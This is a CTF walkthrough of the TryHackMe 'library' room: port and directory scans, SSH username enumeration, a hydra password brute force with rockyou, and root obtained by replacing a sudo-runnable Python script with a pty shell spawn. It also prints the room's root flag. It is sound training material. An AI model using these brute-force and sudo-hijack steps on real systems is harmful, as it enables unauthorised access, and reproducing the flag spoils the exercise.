<a href="https://tryhackme.com/room/bsidesgtlibrary"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>

# library

This is aboot2root machine for FIT and bsides guatemala CTF.

## nmap

Initial
```
~/CTF/tryhackme/library$ nmap -A -sC -sV -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 13:20 BST
Nmap scan report for 10.10.60.21
Host is up (0.020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```
All Ports
```
~/CTF/tryhackme/library$ nmap -p- -oN nmap/all_ports $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 13:21 BST
Nmap scan report for 10.10.60.21
Host is up (0.021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
```
Well, not much showing - just the two ports, one ssh and one html. It maybe worth a search later on the OpenSSH 7.2p2.

## gobuster

### initial
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.60.21
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/22 13:27:34 Starting gobuster
===============================================================
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2020/08/22 13:32:24 Finished
===============================================================

```
### secondary - with common.txt
```
karti@kali-pt:~/CTF/tryhackme/kenobi$ gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -x txt,ssh, php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.60.21
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,ssh,
[+] Timeout:        10s
===============================================================
2020/08/22 13:33:49 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.ssh (Status: 403)
/.hta. (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.ssh (Status: 403)
/.htaccess. (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.ssh (Status: 403)
/.htpasswd. (Status: 403)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/21 20:38:47 Finished
===============================================================
```
## nikto
```
CTF/tryhackme/library$ nikto -h $IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.60.21
+ Target Hostname:    10.10.60.21
+ Target Port:        80
+ Start Time:         2020-08-22 13:32:34 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 153f, size: 590e344b14f00, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-08-22 13:37:08 (GMT1) (274 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Nothing much here to look at.

## webpage discovery

Highlighted in the nikto and gobuster common.txt report, we can have a look at the robots.txt and see what it provides us with.
```
User-agent: rockyou 
Disallow: /
```
Well nothing much to see here unless we try a cookie uith the User-agent: rockyou value. I did try this directly on the browser and also on the commandline with curl. Each time nothing was reported.

Perhaps it is an indication to use rockyou.txt if we have to brute force with another tool? Looking further we can see there are a number of comments from root, anonymous and www-data, which are all well known and likely to be obvious and on the server somewhere, however around the same timestamp we have a post by meliodas. Perhaps this is a username?

## where to now
Looking at what we know. We have:

1. Possibly two (or 5 if we count the www, root and anonymous) usernames that we are aware of. (Don't worry I counted rockyou as well).
1. Two valid open ports
1. Possible OpenSSH exploit if we can find one.

## searchsploit

Lets have a look and see what we can get.
```
/CTF/tryhackme/library$ searchsploit openssh 7.2p2
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                        | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                  | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                            | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                        | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                            | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                           | linux/remote/40113.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Well we are in luck. Lets look at the username enumeration.
```
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set username meliodas
username => meliodas
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 10.10.60.21:22 - SSH - Using malformed packet technique
[*] 10.10.60.21:22 - SSH - Starting scan
[+] 10.10.60.21:22 - SSH - User 'meliodas' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
I was pleased as punch with this as when I went to use hydra I was successful. I then went back and checked if the other name was there - rockyou, and to hell with it, I even threw in a jimbob. All came back positive!!! So not sure how successful that was.

## hydra
```
~/CTF/tryhackme/library$ hydra -t 20 -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-22 14:50:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking ssh://10.10.60.21:22/
[STATUS] 224.00 tries/min, 224 tries in 00:01h, 14344179 to do in 1067:17h, 20 active
[22][ssh] host: 10.10.60.21   login: meliodas   password: <insert-password-here>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-22 14:51:53
```
Next steps - lets check out the ssh with the username and new password.

## ssh

```
~/CTF/tryhackme/library$ ssh meliodas@$IP
The authenticity of host '10.10.159.151 (10.10.159.151)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.159.151' (ECDSA) to the list of known hosts.
meliodas@10.10.159.151's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt 
<insert-user-flag-here>
```
So after a quick look around we have the user flag and able to view a bak.py file. To me it looks as though it backs up the website on the server.
```
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
Lets check our permission level and see what surprises we have in store.
```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
Looks like we can use python (any variant) on the bak.py file in our home folder. Lets run it and see what happens.
```
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
```
To be honest, I spent a fair time, about an hour trying to see how I could amend the file, with only read access. In the end I tried to delete it and then created a new file, with the same name but this time with an interactive shell hopefully waiting at the other end.
```
meliodas@ubuntu:~$ rm bak.py 
rm: remove write-protected regular file 'bak.py'? yes
meliodas@ubuntu:~$ echo "python -c 'import pty;pty.spawn("/bin/bash")'" > bak.py 
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
  File "/home/meliodas/bak.py", line 1
    python -c 'import pty;pty.spawn(/bin/bash)'
                                              ^
SyntaxError: invalid syntax
meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
```
I had some issues initially as my bash reverse shell had python in the main line. Once I removed that, it worked fine and I had access to root. Quick cat command later and I had the root flag.
``` 
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cat /root/root.txt
e8c8c6c256c35515d1d344ee0488c617
root@ubuntu:~# 
```
I really enjoyed this challenge, although I need to ensure that my note taking gets better, especially as it really helps me when coming back to complete these rooms for practice.

Thanks go to [stuxnet](https://tryhackme.com/p/stuxnet) for this room. Much appreciated.

Regards

K

<script src="https://tryhackme.com/badge/65208"></script>
